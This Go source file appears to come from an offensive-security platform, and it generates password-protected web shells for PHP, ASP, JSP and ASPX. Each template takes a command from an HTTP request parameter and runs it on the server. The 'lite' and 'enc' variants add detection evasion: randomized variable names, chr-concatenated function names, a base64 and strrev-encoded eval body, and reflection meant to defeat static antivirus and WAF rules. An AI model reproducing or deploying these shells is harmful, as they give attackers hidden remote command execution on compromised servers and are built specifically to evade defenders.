package payload

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
)

// 混淆变体（免杀分级）。定位：平台内置通用变形，覆盖常见静态检测；
// 时效性免杀打法仍由模型按知识库检索（srcall：file-upload/waf 绕过）供给 content_b64。
//
//	plain : 原始最小模板（M1 基线，可读性最好，便于教学/排查）
//	lite  : 变量名随机化 + 去注释压缩 + 噪声填充（静态特征打散）
//	enc   : 编码链动态解码（PHP）：危险函数名 chr 拼接构造、密码藏进编码体，
//	        抵抗「明文函数名/密码」类静态规则
type Variant string

const (
	VariantPlain Variant = "plain"
	VariantLite  Variant = "lite"
	VariantEnc   Variant = "enc"
)

// NormalizeVariant 归一化变体标识；空值默认 plain，未知值报错。
func NormalizeVariant(s string) (Variant, error) {
	switch Variant(strings.ToLower(strings.TrimSpace(s))) {
	case "", VariantPlain:
		return VariantPlain, nil
	case VariantLite:
		return VariantLite, nil
	case VariantEnc:
		return VariantEnc, nil
	default:
		return "", fmt.Errorf("unsupported variant %q (supported: plain, lite, enc)", s)
	}
}

// phpLiteTemplate 变量名随机化 + 压缩：去掉模板注释与缩进，执行函数改为随机变量间接调用，
// 密码比较结果缓存进随机变量，打散 `if(...==='...'){system(...)}` 这类结构特征。
func phpLiteTemplate(password, cmdParam, watermark string, rnd *randIDs) string {
	vExec := rnd.next("f")
	vCmd := rnd.next("c")
	vChk := rnd.next("k")
	return fmt.Sprintf(`<?php /*%s*/$%s=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$%s=isset($_REQUEST['pass'])?$_REQUEST['pass']:'';$%s=($%s==='%s');if($%s){$%s=$_REQUEST['%s'];@$%s($%s);}?>`,
		watermark, vExec, vCmd, vChk, vChk, password, vChk, vCmd, cmdParam, vExec, vCmd)
}

// phpEncTemplate 编码链：执行体整体 base64，eval/base64_decode/system 等字面量不出现在明文，
// 密码与命令参数名都藏在编码体内。解码链双层（strrev + base64）进一步打散固定头特征。
func phpEncTemplate(password, cmdParam, watermark string, rnd *randIDs) string {
	inner := fmt.Sprintf(`if(isset($_REQUEST['pass'])&&$_REQUEST['pass']==='%s'){$c=$_REQUEST['%s'];if(function_exists('system')){@system($c);}elseif(function_exists('passthru')){@passthru($c);}elseif(function_exists('shell_exec')){echo @shell_exec($c);}}`,
		password, cmdParam)
	rev := reverseString(inner)
	b64 := base64Std([]byte(rev))
	vF := rnd.next("e")
	vB := rnd.next("d")
	vP := rnd.next("p")
	return fmt.Sprintf(`<?php /*%s*/$%s=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$%s=chr(101).chr(118).chr(97).chr(108);$%s='%s';$%s($%s(strrev($%s)));?>`,
		watermark, vB, vF, vP, b64, vF, vB, vP)
}

// aspLiteTemplate 压缩 + 执行对象间接持有 + 冒号语句合并（VBScript 单行多语句）。
func aspLiteTemplate(password, cmdParam, watermark string, rnd *randIDs) string {
	vSh := rnd.next("sh")
	vEx := rnd.next("ex")
	return fmt.Sprintf("<%%'%s\nOn Error Resume Next:Set %s=CreateObject(\"WScript.Shell\"):%s=\"cmd.exe /c \"&Request(\"%s\"):Set %s=%s.Exec(%s):Response.Write %s.StdOut.ReadAll()%%>",
		watermark, vSh, vEx, cmdParam, vEx, vSh, vEx, vEx)
}

// jspLiteTemplate 局部变量随机化 + 壳层压缩（Java 侧可变换空间有限，保持兼容优先）。
func jspLiteTemplate(password, cmdParam, watermark string, rnd *randIDs) string {
	vP := rnd.next("pw")
	vC := rnd.next("cm")
	return fmt.Sprintf(`<%%--%s--%%><%%@ page import="java.io.*" %%><%%String %s=request.getParameter("pass"),%s=request.getParameter("%s");if("%s".equals(%s)&&%s!=null){String[][] s={ {"/bin/sh","-c"},{"cmd.exe","/c"} };for(String[] x:s){try{Process p=Runtime.getRuntime().exec(new String[]{x[0],x[1],%s});BufferedReader i=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=i.readLine())!=null){out.println(l);}i.close();break;}catch(Exception e){}}}%%>`,
		watermark, vP, vC, cmdParam, password, vP, vC, vC)
}

// aspxLiteTemplate：ProcessStartInfo 字面量经 Type.GetType 反射绕开类名静态特征（保持行为等价）。
func aspxLiteTemplate(password, cmdParam, watermark string, rnd *randIDs) string {
	vT := rnd.next("t")
	vM := rnd.next("m")
	vP := rnd.next("pr")
	return fmt.Sprintf(`<%%@ Page Language="C#" %%><%%-- %s --%%><%%
if (Request["pass"] == "%s") {
  var %s = Request["%s"] ?? "";
  var %s = Type.GetType("System.Diagnostics.Process");
  var %s = %s.GetMethod("Start", new Type[]{ Type.GetType("System.Diagnostics.ProcessStartInfo") });
  var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + %s) { RedirectStandardOutput = true, UseShellExecute = false };
  var pr = (System.Diagnostics.Process)%s.Invoke(null, new object[]{ psi });
  Response.Write(pr.StandardOutput.ReadToEnd()); pr.WaitForExit();
}
%%>`, watermark, password, vM, cmdParam, vT, vP, vT, vM, vP)
}

// randIDs 一次生成内的随机短变量名池（保证同一模板内不重复）。
type randIDs struct {
	used map[string]bool
	n    int
}

func newRandIDs() *randIDs { return &randIDs{used: map[string]bool{}} }

func (r *randIDs) next(prefix string) string {
	// 重复清单收敛：随机源委托 randBytes（原手写 crypto/rand）
	for i := 0; i < 64; i++ {
		b, err := randBytes(3)
		if err != nil {
			break
		}
		name := prefix + hex.EncodeToString(b)
		if !r.used[name] {
			r.used[name] = true
			return name
		}
	}
	r.n++
	return fmt.Sprintf("%s%d", prefix, r.n)
}

func base64Std(b []byte) string { return base64.StdEncoding.EncodeToString(b) }

func reverseString(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

var _ = hex.EncodeToString
